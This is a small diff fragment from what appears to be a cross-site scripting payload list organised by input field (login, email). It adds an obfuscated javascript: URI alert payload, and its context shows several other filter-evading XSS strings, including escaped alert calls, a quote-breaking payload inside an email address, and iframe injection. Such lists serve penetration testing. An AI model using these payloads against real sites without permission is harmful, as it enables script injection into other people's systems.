@@ -411,6 +411,7 @@ login
 "-top['al\x65rt'](9)-"	good
 email:- 
 Payload: ["');alert('XSS');//"]@xyz.xxx
+=javascripT:alert(document/**/.domain)
 
 - example.com/?uid="-top['al\x65rt'](9)-"
 - <iframe src="\\www.google.com"></iframe>
